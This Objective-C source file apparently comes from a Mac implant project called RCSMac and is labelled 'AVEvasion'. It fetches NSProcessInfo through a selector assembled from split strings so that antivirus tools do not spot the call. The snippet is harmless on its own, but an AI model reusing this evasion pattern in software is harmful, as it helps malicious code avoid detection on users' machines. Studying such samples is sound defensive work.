//
//  NSProcessInfo+NSProcessInfo__AVEvasion_.m
//  RCSMac
//
//  Created by armored on 13/12/13.
//
//
#import <objc/objc-runtime.h>

#import "NSProcessInfo+NSProcessInfo__AVEvasion_.h"

@implementation NSProcessInfo (NSProcessInfo__A)

+(NSProcessInfo *)PROCESSINFO_SEL
{
  NSProcessInfo *retProcInfo = nil;
  
  Class classSource = objc_getClass("NSProcessInfo");
  
  if (classSource != nil)
  {
    NSString *selName = [NSString stringWithFormat:@"%@%@", @"process", @"Info"];
    SEL processInfoSel = NSSelectorFromString(selName);
    retProcInfo = objc_msgSend(classSource, processInfoSel);
  }
  
  return retProcInfo;
}

@end
